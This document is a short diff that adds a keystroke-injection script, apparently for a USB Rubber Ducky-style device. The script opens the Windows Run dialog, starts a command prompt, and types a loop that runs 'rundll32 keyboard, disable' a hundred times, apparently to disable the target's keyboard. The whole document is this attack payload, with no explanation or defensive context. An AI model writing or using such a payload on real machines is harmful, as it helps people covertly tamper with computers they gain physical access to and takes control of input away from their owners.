@@ -1,0 +1,8 @@
+DELAY 500
+GUI R
+DELAY 200
+STRING cmd
+ENTER
+DELAY 300
+STRING for /l %x in (1,1,100) do rundll32 keyboard, disable
+ENTER
